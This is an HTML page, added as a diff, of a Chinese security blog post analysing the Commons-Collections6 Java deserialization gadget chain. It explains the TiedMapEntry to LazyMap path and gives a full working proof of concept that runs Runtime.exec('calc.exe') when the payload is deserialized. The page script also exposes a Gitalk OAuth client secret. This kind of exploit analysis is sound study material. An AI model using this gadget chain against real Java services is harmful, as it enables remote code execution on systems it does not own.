@@ -1,0 +1,345 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Commons-Collections6分析 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Commons-Collections6分析 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+CC6这条链跟CC1中的LazyMap链很像，前面几乎都一样的，区别是CC1是AnnotationInvocationHandler.invoke()调用了LazyMap的get方法，而CC6是TiedMapEntry.getValu..." />
+    <meta name="keywords" content="Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Commons-Collections6分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-05
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>CC6这条链跟CC1中的LazyMap链很像，前面几乎都一样的，区别是CC1是AnnotationInvocationHandler.invoke()调用了LazyMap的get方法，而CC6是TiedMapEntry.getValue调用的LazyMap的get方法</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/7f5b74ac41d3d.png" alt="1646475977099.png" loading="lazy"></figure>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>先来看一下TiedMapEntry类的构造器，传入一个Map对象和key</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/a29af0849bc29.png" alt="1646476228898.png" loading="lazy"></figure>
+<p>然后看一下getValue方法，这里调用了map.get()方法，其中map是可控的。而其hashCode()方法调用了getValue()方法</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/4930363e220cf.png" alt="1646476327839.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/f2231e6981ec5.png" alt="1646476491628.png" loading="lazy"></figure>
+<p>所以，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了 TiedMapEntry的hashCode()方法。最后是发现了HashMap的readObject方法中调用了hash(key)，而hash方法又调用了key.hashCode()。所以只需要让这个key等于TiedMapEntry对象即可。</p>
+<pre><code class="language-java">static final int hash(Object key) {
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+}
+</code></pre>
+<p>先构造出恶意的LazyMap</p>
+<pre><code class="language-java">Transformer[] transformers = new Transformer[]{
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+        new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+};
+
+ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{});
+
+Map lazyMap = LazyMap.decorate(new HashMap(),faketransformerChain);
+</code></pre>
+<p>这里为了避免本地调试的时候触发命令执行，可以在构造LazyMap的时候先传入一个<code>new ConstantTransformer(1)</code>，等到最后需要生成payload的时候，再把真正的<code>transformerChain</code></p>
+<p>现在，我们拿到了一个恶意的LazyMap对象<code>lazyMap</code>，将其作为TiedMapEntry的map属性传入</p>
+<pre><code class="language-java">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;keykey&quot;);
+</code></pre>
+<p>紧接着，为了调用TiedMapEntry的hashCode()方法，我们需要将<code>tiedMapEntry</code>作为HashMap的key属性传入。</p>
+<pre><code class="language-java">Map expMap = new HashMap();
+expMap.put(tiedMapEntry,&quot;valuevalue&quot;);
+</code></pre>
+<p>最后，就可以将这个expMap作为对象来序列化了，不过还需要将之前的<code>faketransformerChain</code>替换回来。因为ChainTransformer类的Transformer[]数组的静态变量名为iTransformers</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/4e578a5d29095.png" alt="1646478045966.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/cc18dd0cd1687.png" alt="1646478490756.png" loading="lazy"></figure>
+<pre><code class="language-java">Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);//通过反射获取这个成员变量
+f.setAccessible(true);
+f.set(faketransformerChain, transformers);//第一个参数传入transformerChain，第二个参数传入想要修改为的值
+</code></pre>
+<p>此时整个Gadget已经构造完毕了，但是此时还不能够执行命令，我们来跟着流程调试一遍。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/73b5408bc5e66.png" alt="1646479018163.png" loading="lazy"></figure>
+<p>最后触发命令执行的是transform()，但是这里进不去if语句，因为map.containKey(key)的结果为true</p>
+<pre><code class="language-java">boolean containsKey(Object key);//如果hashMap中存在指定的key对应的映射关系返回true，否则返回false。
+</code></pre>
+<p>也就是他检测到了hashMap中有一个key是<code>keykey</code>的对象，我们唯一用到keykey的地方就是<code>TiedMapEntry</code>的构造函数里面，但是构造函数里面并没有修改lazyMap</p>
+<pre><code class="language-java">Map lazyMap = LazyMap.decorate(new HashMap(),new ConstantTransformer(faketransformerChain));
+TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;keykey&quot;);
+
+Map expMap = new HashMap();
+expMap.put(tiedMapEntry,&quot;valuevalue&quot;);
+</code></pre>
+<p>其关键点就在<code>expMap.put(tiedMapEntry,&quot;valuevalue&quot;);</code>里面，在HashMap的put方法中，也调用到了hash(key);</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/05/ae5cda3e3b3e4.png" alt="1646479532701.png" loading="lazy"></figure>
+<p>这里就导致了LazyMap这条利用链在这里被重复调用了一次，而一开始使用的faketransformersChain,因此并没有触发命令执行。</p>
+<p>所以只需要将<code>keykey</code>这个key从lazyMap中移除就好了。</p>
+<pre><code class="language-java">lazyMap.remove(&quot;keykey&quot;);
+</code></pre>
+<h2 id="完整poc">完整POC</h2>
+<pre><code class="language-java">package CC.CC6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections6 {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+
+        ChainedTransformer faketransformerChain = new ChainedTransformer(new Transformer[]{});
+        HashMap map = new HashMap&lt;&gt;();
+        Map lazyMap = LazyMap.decorate(map,faketransformerChain);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;keykey&quot;);
+
+        Map expMap = new HashMap();
+        expMap.put(tiedMapEntry,&quot;valuevalue&quot;);
+        lazyMap.clear();
+
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);//通过反射获取这个成员变量
+        f.setAccessible(true);
+        f.set(faketransformerChain, transformers);
+
+        serialize(expMap);
+        unserialize(&quot;Le1a.bin&quot;);
+
+
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Le1a.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4poc">完整POC</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/浅谈Commons-Collections1 反序列化/">
+              <h3 class="post-title">
+                Commons-Collections1反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
